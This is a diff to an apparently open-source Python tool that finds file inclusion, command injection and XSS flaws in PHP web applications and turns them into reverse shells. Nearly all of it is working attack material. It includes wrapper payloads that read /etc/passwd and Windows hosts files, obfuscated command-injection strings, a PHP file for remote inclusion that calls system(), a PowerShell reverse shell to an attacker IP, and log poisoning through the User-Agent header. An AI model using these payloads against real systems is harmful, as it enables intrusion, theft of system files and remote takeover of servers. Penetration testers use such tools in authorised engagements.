@@ -7,6 +7,7 @@ import socket
 import subprocess
 import time
 import random
+import base64
 import argparse
 import requests
 import requests.exceptions
@@ -17,7 +18,6 @@ import socketserver
 import traceback
 import errno
 import fileinput
-import platform
 import urllib.parse as urlparse
 
 from contextlib import closing
@@ -39,12 +39,22 @@ def serve_forever():
         with socketserver.TCPServer(("", rfi_test_port), ServerHandler) as httpd:
 
             if(args.verbose):
-                print("[i] Opening local web server on port " +  str(rfi_test_port) + " and setting up 'rfitest.txt' that will be used as test inclusion")
+                print("[i] Opening local web server on port " +  str(rfi_test_port) + " and setting up 'rfitest' that will be used as test inclusion")
 
-            tempf = open("rfitest.txt", "w")
-            tempf.write("961bb08a95dbc34397248d92352da799")
-            tempf.close()
-        
+            with open("rfitest", "w") as tempf:
+                tempf.write("<html>\n")
+                tempf.write("961bb08a95dbc34397248d92352da799\n")
+                tempf.write("<?php\n")
+                tempf.write("echo system('ipconfig');\n")
+                tempf.write("echo shell_exec('ipconfig');\n")
+                tempf.write("echo passthru('ipconfig');\n")
+                tempf.write("echo system('cat /etc/passwd');\n")
+                tempf.write("echo shell_exec('cat /etc/passwd');\n")
+                tempf.write("echo passthru('cat /etc/passwd');\n")
+                tempf.write("?>\n")
+                tempf.write("</body>\n")
+                tempf.write("</html>")
+                tempf.close()
             try:
                 httpd.serve_forever()
             except:
@@ -71,7 +81,7 @@ class ICMPThread(threading.Thread):
 
     def getResult(self):
         return self.result
-    
+
     def setResult(self, boolean):
         self.result = boolean
 
@@ -122,45 +132,48 @@ def addToExploits(req, request_type, exploit_type, getVal, postVal, headers, att
 def init(req, reqType, explType, getVal, postVal, headers, attackType, cmdInjectable = False):
 
     #Add them from the most complex one to the least complex. This is important.
-    #TODO change this shite mechanism, because i don't even remember how this works anymore.
     TO_REPLACE = ["Windows/System32/drivers/etc/hosts", "cat%20/etc/passwd|head%20-n%201", 
-                  "cat%20/etc/group|head%20-n%201", "cat%20%2F%2Fetc%2Fpasswd",
+                  "cat%20/etc/group|head%20-n%201", "cat%20%2F%2Fetc%2Fpasswd", 
+                  "%windir%\System32\drivers\etc\hosts", "C:\Windows\System32\drivers\etc\hosts",
                   "cat%20%2F%2Fetc%2Fgroup","file%3A%2F%2F%2Fetc%2Fpasswd%2500", 
                   "file%3A%2F%2F%2Fetc%2Fpasswd", "cat%20/etc/passwd", "cat%20/etc/group",
-                  "///etc/passwd", "cat /etc/passwd","cat /etc/group",  "/etc/passwd", "file%3A%2F%2F%2Fetc%2Fgroup%2500", 
-                  "file%3A%2F%2F%2Fetc%2Fgroup", "file://etc/group%00", "file:///etc/group", 
-                  "/etc/group","https://www.google.com/", "rfitest.txt", "ipconfig"]
+                  "///etc/passwd", "/etc/passwd", "file://C:\Windows\System32\drivers\etc\hosts",
+                  "file%3A%2F%2F%2Fetc%2Fgroup", "file%3A%2F%2F%2Fetc%2Fgroup", 
+                  "file://etc/group%00", "file:///etc/group","Windows%5CSystem32%5Cdrivers%5Cetc%5Chosts",
+                  "Windows\\System32\\drivers\\etc\\hosts",
+                  "/etc/group","https://www.google.com/", "rfitest", "ipconfig"]
     
-
     if(scriptName != ""):
         TO_REPLACE.append(scriptName)
         TO_REPLACE.append(scriptName+".php")
         TO_REPLACE.append(scriptName+"%00")
-   
+    
+
     if(args.lhost != None):
         TO_REPLACE.append("ping -c 1 " + args.lhost)
         TO_REPLACE.append("ping%20-c%201%20" + args.lhost)
         TO_REPLACE.append("ping -n 1 " + args.lhost)
         TO_REPLACE.append("ping%20-n%201%20" + args.lhost)
-    
+        TO_REPLACE.append("test%3Bping%24%7BIFS%25%3F%3F%7D-n%24%7BIFS%25%3F%3F%7D1%24%7BIFS%25%3F%3F%7D{0}%3B".format(args.lhost))
+
+
     if(checkPayload(req) or cmdInjectable):
         for i in range(len(TO_REPLACE)):
             if(getVal.find(TO_REPLACE[i]) > -1 or postVal.find(TO_REPLACE[i]) > -1 or getVal.find("?c=" + TO_REPLACE[i]) > -1):
                 u = getVal.replace(TO_REPLACE[i], tempArg)
                 p = postVal.replace(TO_REPLACE[i], tempArg)
-
-                #TODO this can be better
-                if("windows" in TO_REPLACE[i].lower()):
-                    os = "WINDOWS"
-                else: os = "LINUX"
                 
+                if("windows" in TO_REPLACE[i].lower() or "ipconfig" in TO_REPLACE[i].lower() or "Windows IP Configuration" in req.text):
+                    os = "windows"
+                else: os = "linux"
+
                 exploit = addToExploits(req, reqType, explType, u, p, headers, attackType, os)
                     
                 #Print finding
                 if(postVal == ""):
                     print("[+] " + explType + " -> '" + getVal + "'")
                 else:
-                    print("[+] "+ explType + " -> '" + getVal + "' -> HTTP POST -> '" + postVal + "'")
+                    print("[+] " + explType + " -> '" + getVal + "' -> HTTP POST -> '" + postVal + "'")
 
                 if(args.revshell):
                     pwn(exploit)
@@ -174,19 +187,14 @@ def init(req, reqType, explType, getVal, postVal, headers, attackType, cmdInject
 
 def test_file_trunc(url):
     if(args.verbose):
-        print("Testing file wrapper inclusion...")
+        print("[i] Testing file wrapper inclusion...")
     
     tests = []
     tests.append("file:///etc/passwd")
     tests.append("file:///etc/passwd%00")
-    tests.append("file%3A%2F%2F%2Fetc%2Fpasswd")
-    tests.append("file%3A%2F%2F%2Fetc%2Fpasswd%2500")
-    tests.append("file:///etc/group")
-    tests.append("file:///etc/group%00")
-    tests.append("file%3A%2F%2F%2Fetc%2Fgroup")
-    tests.append("file%3A%2F%2F%2Fetc%2Fgroup%2500")
     
-    tests.append("file://C:\Windows\System32\drivers\etc")
+    tests.append("file://C:\Windows\System32\drivers\etc\hosts")
+    tests.append("file://C:\Windows\System32\drivers\etc\hosts%00")
 
     if(not args.postreq):
         for i in range(len(tests)):
@@ -206,7 +214,7 @@ def test_file_trunc(url):
 
 def test_trunc(url):
     if(args.verbose):
-        print("Testing path truncation using '" + truncWordlist + "' wordlist...")
+        print("[i] Testing path truncation using '" + truncWordlist + "' wordlist...")
 
     if(not args.postreq):
         with open(truncWordlist, "r") as f:
@@ -228,20 +236,16 @@ def test_trunc(url):
 
                 if(init(res, "POST", "LFI", url, postTest, headers, "TRUNC")):
                     break
-        
-    
     return
 
 def test_cmd_injection(url):
     if(args.verbose):
-        print("Testing for classic results-based os command injection...")
+        print("[i] Testing for classic results-based os command injection...")
     
-    # Classing results-based cmd injection test
     if(not args.postreq):
         with open(cmdWordlist) as f:
             for line in f:
                 line = line.replace("\n", "")
-                if(line == ""): continue
                 u = url.replace(args.param, line)
 
                 res = requests.get(u, headers = headers, proxies = proxies)
@@ -257,11 +261,11 @@ def test_cmd_injection(url):
 
                 if(init(res, "POST", "RCE", url, postTest, headers, "CMD")):
                     return
-    
-    # ICMP exfiltration technique 
+
+     # ICMP exfiltration technique
     if(args.lhost):
         if(args.verbose):
-            print("Testing for blind OS command injection via ICMP exfiltration...")
+            print("[i] Testing for blind OS command injection via ICMP exfiltration&listener...")
 
         t = ICMPThread()
         t.start()
@@ -269,7 +273,9 @@ def test_cmd_injection(url):
         icmpTests = []
         icmpTests.append(";ping%20-c%201%20" + args.lhost)
         icmpTests.append(";ping%20-n%201%20" + args.lhost)
-    
+        icmpTests.append("test%3Bping%24%7BIFS%25%3F%3F%7D-c%24%7BIFS%25%3F%3F%7D1%24%7BIFS%25%3F%3F%7D{0}%3B".format(args.lhost))
+        icmpTests.append("test%3Bping%24%7BIFS%25%3F%3F%7D-n%24%7BIFS%25%3F%3F%7D1%24%7BIFS%25%3F%3F%7D{0}%3B".format(args.lhost))
+        
         for test in icmpTests:
             if(args.postreq):
                 postTest = args.postreq.replace(args.param, test)
@@ -278,18 +284,18 @@ def test_cmd_injection(url):
                     t.setResult(False)
                     if(init(res, "POST", "RCE", url, postTest, headers, "CMD", True)):
                         return
-            else: 
+            else:
                 u = url.replace(args.param, test)
                 res = requests.get(u, headers = headers, proxies = proxies)
                 if(t.getResult() == True):
                     t.setResult(False)
                     if(init(res, "GET", "RCE", u, "", headers, "CMD", True)):
                         return
-        
+
 
 def test_xss(url):
     if(args.verbose):
-        print("Testing for XSS...")
+        print("[i] Testing for XSS...")
 
     with open(xssWordlist, "r") as f:
         for line in f:
@@ -298,16 +304,23 @@ def test_xss(url):
             
             if(args.postreq): res = requests.post(url, data = args.postreq.replace(args.param, line), headers = headers, proxies = proxies)
             else: res = requests.get(u, headers = headers, proxies = proxies)
-            if(line in res.text):
-                print("[+] XSS -> '" + u + "'")
-
-            if(not args.no_stop):
-                break
+            
+            matcher = []
+            matcher.append("<script>alert(document.domain);</script>")
+            matcher.append("<svg><animatetransform onbegin=alert(document.domain)>")
+            matcher.append("<img src=x onerror=alert(document.domain)>")
+            
+            for item in matcher:
+                if(item in res.text):
+                    if(args.postreq): print("[+] XSS -> '" + u + "' -> HTTP POST -> '" + args.postreq.replace(args.param, line) + "'")
+                    else: print("[+] XSS -> '" + u + "'")
+                    if(not args.no_stop):
+                        return
     return
 
 def test_filter(url):
     if(args.verbose):
-        print("Testing filter wrapper...")
+        print("[i] Testing filter wrapper...")
     
     global scriptName
 
@@ -318,20 +331,12 @@ def test_filter(url):
     tests.append("php://filter/convert.base64-encode/resource=/etc/passwd%00")
     tests.append("php://filter/read=string.rot13/resource=/etc/passwd")
     tests.append("php://filter/read=string.rot13/resource=/etc/passwd%00")
-    tests.append("php://filter/resource=/etc/group")
-    tests.append("php://filter/resource=/etc/group%00")
-    tests.append("php://filter/convert.base64-encode/resource=/etc/group")
-    tests.append("php://filter/convert.base64-encode/resource=/etc/group%00")
-    tests.append("php://filter/read=string.rot13/resource=/etc/group")
-    tests.append("php://filter/read=string.rot13/resource=/etc/group%00")
         
-    tests.append("php://filter/resource=C:/Windows/System32/drivers/etc/hosts")
-    tests.append("php://filter/resource=C:/Windows/System32/drivers/etc/hosts%00")
-    tests.append("php://filter/convert.base64-encode/resource=C:/Windows/System32/drivers/etc/hosts")
-    tests.append("php://filter/convert.base64-encode/resource=C:/Windows/System32/drivers/etc/hosts%00")
-    tests.append("php://filter/read=string.rot13/resource=C:/Windows/System32/drivers/etc/hosts")
-    tests.append("php://filter/read=string.rot13/resource=C:/Windows/System32/drivers/etc/hosts%00")
-    
+    tests.append("php://filter/resource=..\..\..\..\..\..\..\..\Windows\System32\drivers\etc\hosts")
+    tests.append("php://filter/resource=..\..\..\..\..\..\..\..\Windows\System32\drivers\etc\hosts%00")
+    tests.append("php://filter/resource=C:\Windows\System32\drivers\etc\hosts") 
+    tests.append("php://filter/resource=C:\Windows\System32\drivers\etc\hosts%00") 
+    tests.append("php://filter/resource=%25windir%25%5CSystem32%5Cdrivers%5Cetc%5Chosts")
     
     script = os.path.splitext(os.path.basename(urlparse.urlsplit(url).path))
     scriptName = script[0]
@@ -355,7 +360,7 @@ def test_filter(url):
             except ConnectionError:
                 print("Connection error has occurred...")
             except Exception as e:
-                #TODO
+                raise
                 pass
     else:
         for i in range(len(tests)):
@@ -369,16 +374,14 @@ def test_filter(url):
 
 def test_data(url):
     if(args.verbose):
-        print("Testing data wrapper...")
+        print("[i] Testing data wrapper...")
 
     tests = []
     
     if(not args.postreq):
         
         tests.append("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K&c=cat%20/etc/passwd")
-        tests.append("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K&c=cat%20/etc/group")
         tests.append("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K&c=ipconfig")
-        tests.append("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K&ctype%20C:/Windows/System32/drivers/etc/hosts")
         
         for i in range(len(tests)):
             u = url.replace(args.param, tests[i])
@@ -389,9 +392,7 @@ def test_data(url):
     else:
         urls = []
         urls.append("?c=cat%20/etc/passwd")
-        urls.append("?c=cat%20/etc/group")
         urls.append("?c=ipconfig")
-        urls.append("?c=type%20C:/Windows/System32/drivers/etc/hosts")
 
         test = "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K"
 
@@ -405,15 +406,14 @@ def test_data(url):
 
 def test_input(url):
     if(args.postreq):
-        if(args.verbose): print("$_POST arguments are not LFI-able using php://input. Skipping input wrapper test...")
+        if(args.verbose): print("[-] $_POST arguments are not LFI-able using php://input. Skipping input wrapper test...")
         return
 
     if(args.verbose):
-        print("Testing input wrapper...")
+        print("[i] Testing input wrapper...")
 
     tests = []
     tests.append("php://input&cmd=cat%20/etc/passwd")
-    tests.append("php://input&cmd=cat%20/etc/group")
 
     tests.append("php://input&cmd=ipconfig")
     
@@ -435,15 +435,13 @@ def test_input(url):
 
 def test_expect(url):
     if(args.verbose):
-            print("Testing expect wrapper...")
+            print("[i] Testing expect wrapper...")
 
     tests = []
     tests.append("expect://etc/passwd")
-    tests.append("expect://etc/group")
     tests.append("expect://cat%20/etc/passwd")
     tests.append("expect://cat%20/etc/passwd")
     tests.append("expect:%2F%2Fcat%20%2Fetc%2Fpasswd")
-    tests.append("expect:%2F%2Fcat%20%2Fetc%2Fgroup")
 
     tests.append("expect:%2F%2Fipconfig")
 
@@ -464,13 +462,13 @@ def test_expect(url):
 
 def test_rfi(url):
     if(args.verbose):
-        print("Testing for RFI...")
+        print("[i] Testing remote file inclusion...")
     
     #Localhost RFI test
     if(args.lhost):
         try:
             threading.Thread(target=serve_forever).start()
-            test = "http://{0}:{1}/rfitest.txt".format(args.lhost, str(rfi_test_port))
+            test = "http://{0}:{1}/rfitest".format(args.lhost, str(rfi_test_port))
             u = url.replace(args.param, test)
 
             if(not args.postreq):
@@ -481,7 +479,7 @@ def test_rfi(url):
                 res = requests.post(url, headers = headers, data = postTest, proxies = proxies)
                 if(init(res, "POST", "RFI", url, postTest, headers, "RFI")): return
         except:
-            #lfimap_cleanup()
+            raise
             pass
 
     #Internet RFI test
@@ -496,32 +494,34 @@ def test_rfi(url):
             res = requests.post(url, data = postTest, headers = headers, proxies = proxies)
             if(init(res, "POST", "RFI", url, postTest, headers, "RFI")): return
     except:
-        #TODO
         pass
 
 def test_errors(url):
     if(args.verbose):
-        print("Testing for error info disclosure...")
+        print("[i] Testing for info disclosure using heuristics...")
 
     tests = []
     tests.append("/?!%$$%!?/")
     
-    errors = ["Warning", "include("]
+    errors = ["Warning", "include_path"]
 
     if(not args.postreq):
         for test in tests:
             u = url.replace(args.param, test)
             res = requests.get(u,  headers = headers, proxies = proxies)
             if(errors[0] in res.text and errors[1] in res.text):
-                print("[+] Possible LFI -> include() error triggered -> " + u)
+                print("[+] Possible LFI ->  error triggered -> '" + u + "'")
+                if("C:" in res.text or "D:" in res.text):
+                    print("[i] Detected windows OS signatures, based on response.")
     else:
         for test in tests:
             postTest = args.postreq.replace(args.param, test)
             req = requests.post(url, headers = headers, data = postTest, proxies = proxies)
             
             if(errors[0] in req.text and errors[1] in req.text):
-                print("[+] Possible LFI -> include() error triggered -> " + url + " -> HTTP POST -> " + postTest)
-
+                print("[+] Possible LFI error triggered -> '" + url + "' -> HTTP POST -> '" + postTest + "'")
+                if("/php" in res.text):
+                    print("[i] Detected linux OS signatures, based on response.")
         return
 
 
@@ -535,12 +535,12 @@ def checkPayload(webResponse):
                 "Windows IP Configuration", "OyBmb3IgMT", "; sbe 16-ovg ncc fhccbeg",
                 "; sbe 16-ovg ncc fhccbeg", "fnzcyr UBFGF svyr hfrq ol Zvpebfbsg",
                 ";  f o r  1 6 - b i t  a p p", "fnzcyr UBFGF svyr hfrq ol Zvpebfbsg",
-                "c2FtcGxlIEhPU1RT", "=1943785348b45", "www-data:x",
+                "c2FtcGxlIEhPU1RT", "=1943785348b45", "www-data:x", "PD9w",
                 "window.google=", "961bb08a95dbc34397248d92352da799", "PCFET0NUWVBFIGh0b",
                 "PGh0bW"]
-
+    
     for word in KEY_WORDS:
-        if word in webResponse.text and "PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K" not in webResponse.text and ("Warning" not in webResponse.text and "include(" not in webResponse.text):
+         if word in webResponse.text and "PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K" not in webResponse.text:
             return True
     return False
 
@@ -804,10 +804,10 @@ def exploit_powershell(exploit, method, ip, port):
                          "+%3d+(New-Object+-TypeName+System.Text.ASCIIEncoding).GetString($bytes,0,+$i)%3b$sendback+%3d+(iex+$data+2>%261+|+Out-String+)%3b$"\
                          "sendback2+%3d+$sendback+%2b+'PS+'+%2b+(pwd).Path+%2b+'>+'%3b$sendbyte+%3d+([text.encoding]%3a%3aASCII).GetBytes($sendback2)%3b$stream"\
                          ".Write($sendbyte,0,$sendbyte.Length)%3b$stream.Flush()}%3b$client.Close()\" "
-
+    
     powershellPayload = powershellPayload.replace("{IP}", ip)
     powershellPayload = powershellPayload.replace("{PORT}", str(port))
-
+    
     if(method == "INPUT"):
         res = requests.post(url.replace(tempArg, powershellTest), headers = headers, data = exploit['POSTVAL'], proxies = proxies)
         if("Windows IP Configuration" in res.text):
@@ -847,41 +847,57 @@ def exploit_powershell(exploit, method, ip, port):
             else: requests.get(url.replace(tempArg, powershellPayload), headers = headers, proxies = proxies)
             return True
 
-def exploit_rfi(exploit, method, ip, port):
-
-    url = exploit['GETVAL']
-    
+def prepareRfiExploit(payloadFile, temporaryFile, ip, port):
     #Copy a file from exploits/reverse_shell.php
-    if(not os.path.exists("exploits/reverse_shell.php")):
-        print("[-] Cannot find exploits/reverse_shell.php. Skipping RFI exploit...")
+    if(not os.path.exists(payloadFile)):
+        print("[-] Cannot find " + payloadFile + ". Skipping RFI exploit...")
         return
     else:
         #Prepare file that will be included
-        with open("exploits/reverse_shell.php", "r") as f:
-            with open("reverse_shell.php", "w") as r:
+        with open(payloadFile, "r") as f:
+            with open(temporaryFile, "w") as r:
                 lines = f.readlines()
                 for line in lines:
                     line = line[:-1]
                     r.write(line + "\n")
     
-    #Modify reverse_shell.php ip and port number values
-    with(fileinput.FileInput("reverse_shell.php", inplace = True)) as file:
+    #Modify reverse_shell_temp.php ip and port number values
+    with(fileinput.FileInput(temporaryFile, inplace = True)) as file:
         for line in file:
             #This redirects stdout to a file, replacing the ip and port values as needed
             print(line.replace("IP_ADDRESS", ip), end='')
-    with(fileinput.FileInput("reverse_shell.php", inplace = True)) as file:
+    with(fileinput.FileInput(temporaryFile, inplace = True)) as file:
         for line in file:
             print(line.replace("PORT_NUMBER", str(port)), end='')
+
+def exploit_rfi(exploit, method, ip, port):
     
+    os = exploit['OS']
+    url = exploit['GETVAL']
     printInfo(ip, port, "php", "Remote File Inclusion")
+    
     if(not args.postreq):
-        requests.get(url.replace(tempArg, "/reverse_shell.php"), headers = headers, proxies = proxies)
+        if(exploit['OS'] == "windows"):
+            prepareRfiExploit("exploits/reverse_shell_win.php", "reverse_shell_win_tmp.php", ip, port)
+            res = requests.get(url.replace(tempArg, "/reverse_shell_win_tmp.php"), headers = headers, proxies = proxies)
+        else:
+            prepareRfiExploit("exploits/reverse_shell_lin.php", "reverse_shell_lin_tmp.php", ip, port)
+            print(url.replace(tempArg, "/reverse_shell_lin_tmp.php"))
+            res = requests.get(url.replace(tempArg, "/reverse_shell_lin_tmp.php"), headers = headers, proxies = proxies)
     else:
-        requests.post(url, data = exploit['POSTVAL'].replace(tempArg, "/reverse_shell.php"), headers = headers, proxies = proxies)
+        if(exploit['OS'] == "linux"):
+            prepareRfiExploit("exploits/reverse_shell_lin.php", "reverse_shell_lin_tmp.php", ip, port)
+            requests.post(url, data = exploit['POSTVAL'].replace(tempArg, "/reverse_shell_lin_tmp.php"), headers = headers, proxies = proxies)
+        else:
+            prepareRfiExploit("exploits/reverse_shell_win.php", "reverse_shell_win_tmp.php", ip, port) 
+            requests.post(url, data = exploit['POSTVAL'].replace(tempArg, "/reverse_shell_win_tmp.php"), headers = headers, proxies = proxies)
     return
 
 
 def exploit_log_poison(ip, port, url, payloadStageOne, payloadStageTwo, testPayload, testString, post):
+    if(args.verbose):
+        print("[i] Trying to locate http access log file...")
+
     maliciousHeaders = headers.copy()
     maliciousHeaders['User-Agent'] = "<?php system($_GET['c']); ?>"
     
@@ -933,7 +949,7 @@ def pwn(exploit):
     method = exploit['ATTACK_METHOD']
 
     if(method == "INPUT"):
-        if(exploit['OS'] == "LINUX"):
+        if(exploit['OS'] == "linux"):
             if(exploit_bash(exploit, "INPUT", ip, port)): return
             if(exploit_nc(exploit, "INPUT", ip, port)): return
             if(exploit_php(exploit, "INPUT", ip, port)): return
@@ -943,7 +959,7 @@ def pwn(exploit):
             if(exploit_powershell(exploit, "INPUT", ip, port)): return   
 
     elif(method == "DATA"):
-        if(exploit['OS'] == "LINUX"):
+        if(exploit['OS'] == "linux"):
             if(exploit_bash(exploit, "DATA", ip, port)): return
             if(exploit_nc(exploit, "DATA", ip, port)): return
             if(exploit_php(exploit, "DATA", ip, port)): return
@@ -953,7 +969,7 @@ def pwn(exploit):
             if(exploit_powershell(exploit, "DATA", ip, port)): return
 
     elif(method == "EXPECT"):
-        if(exploit['OS'] == "LINUX"):
+        if(exploit['OS'] == "linux"):
             if(exploit_bash(exploit, "EXPECT", ip, port)): return
             if(exploit_nc(exploit, "EXPECT", ip, port)): return
             if(exploit_php(exploit, "EXPECT", ip, port)): return
@@ -966,7 +982,7 @@ def pwn(exploit):
         if(exploit_rfi(exploit, "RFI", ip, port)): return
     
     elif(method == "TRUNC"):
-        if(exploit['OS'] == "LINUX"):
+        if(exploit['OS'] == "linux"):
             if(exploit_bash(exploit, "TRUNC", ip, port)): return
             if(exploit_nc(exploit, "TRUNC", ip, port)): return
             if(exploit_php(exploit, "TRUNC", ip, port)): return
@@ -976,7 +992,7 @@ def pwn(exploit):
             if(exploit_powershell(exploit, "TRUNC", ip, port)): return
     
     elif(method == "CMD"):
-        if(exploit['OS'] == "LINUX"):
+        if(exploit['OS'] == "linux"):
             if(exploit_bash(exploit, "CMD", ip, port)): return
             if(exploit_nc(exploit, "CMD", ip, port)): return
             if(exploit_php(exploit, "CMD", ip, port)): return
@@ -988,21 +1004,21 @@ def pwn(exploit):
 
 #Cleans up all created files during testing
 def lfimap_cleanup():
-    if(os.path.exists("rfitest.txt")):
-        os.remove("rfitest.txt")
-
-    if(os.path.exists("reverse_shell.php")):
-        os.remove("reverse_shell.php")
+    if(os.path.exists("rfitest")):
+        os.remove("rfitest")
     
+    if(os.path.exists("reverse_shell_lin_tmp.php")):
+        os.remove("reverse_shell_lin_tmp.php")
+    if(os.path.exists("reverse_shell_win_tmp.php")):
+        os.remove("reverse_shell_win_tmp.php")
     os._exit(0)
 
 def main():
     global exploits
     global proxies
     
-    if(args.proxyAddr):
-        proxies['http'] = "http://"+args.proxyAddr
-        proxies['https'] = "https://"+args.proxyAddr
+    proxies['http'] = args.proxyAddr
+    proxies['https'] = args.proxyAddr
 
     #Perform all tests
     if(args.test_all):
@@ -1076,7 +1092,7 @@ if(__name__ == "__main__"):
     optionsGroup.add_argument('-D', type=str, metavar='<request>', dest='postreq', help='\t\t Do HTTP POST value test. Ex: "param=PWN"')
     optionsGroup.add_argument('-H', type=str, metavar='<header>', action='append', dest='httpheaders', help='\t\t Specify additional HTTP header(s). Ex: "X-Forwarded-For:127.0.0.1"')
     optionsGroup.add_argument('-C', type=str, metavar='<cookie>', dest='cookie', help='\t\t Specify session cookie, Ex: "PHPSESSID=1943785348b45"')
-    optionsGroup.add_argument('-P', type=str, metavar = '<proxy>', dest='proxyAddr', help='\t\t Specify Proxy IP address. Ex: "127.0.0.1:8080"')
+    optionsGroup.add_argument('-P', type=str, metavar = '<proxy>', dest='proxyAddr', help='\t\t Specify Proxy IP address. Ex: "http://127.0.0.1:8080"')
     optionsGroup.add_argument('--useragent', type=str, metavar= '<agent>', dest='agent', help='\t\t Specify HTTP user agent')
     optionsGroup.add_argument('--referer', type=str, metavar = '<referer>', dest='referer', help='\t\t Specify HTTP referer')
     optionsGroup.add_argument('--param', type=str, metavar='<name>', dest='param', help='\t\t Specify different test parameter value')
@@ -1093,7 +1109,6 @@ if(__name__ == "__main__"):
     attackGroup.add_argument('--file', action = 'store_true', dest='file', help='\t\t Attack using file:// wrapper')
     attackGroup.add_argument('--xss', action = 'store_true', dest = 'xss', help='\t\t Cross site scripting test')
     attackGroup.add_argument('-a', '--all', action = 'store_true', dest = 'test_all', help='\t\t Use all available methods to attack')
-    
     
     payloadGroup = parser.add_argument_group('PAYLOAD OPTIONS')
     payloadGroup.add_argument('-x', '--exploit',action='store_true', dest='revshell', help='\t\t Exploit to reverse shell if possible (Setup reverse listener first)')
@@ -1216,6 +1231,21 @@ if(__name__ == "__main__"):
             if(args.lport < 1 or args.lport > 65534):
                 print("[-] LPORT must be between 1 and 65534. Exiting ...")
                 sys.exit(-1)
+    
+    #Check if proxy is correct
+    if(args.proxyAddr):
+        if("http" in args.proxyAddr or "socks" in args.proxyAddr):
+            try:
+                r = requests.get(args.proxyAddr)
+                if(r.status_code >= 500):
+                    print("[-] Proxy server is available, but it returns server-side error code >=500. Exiting...")
+                    sys.exit(-1)
+            except:
+                print("[-] Proxy server is not available. Exiting...")
+                sys.exit(-1)
+        else: 
+            print("[-] Please specify proxy protocol: http://, https:// or socks5://. Exiting...")
+            sys.exit(-1)
 
     #Preparing temp args
     TEMP = ["CMD", "TEMP", "LFIMAP", "LFI"]
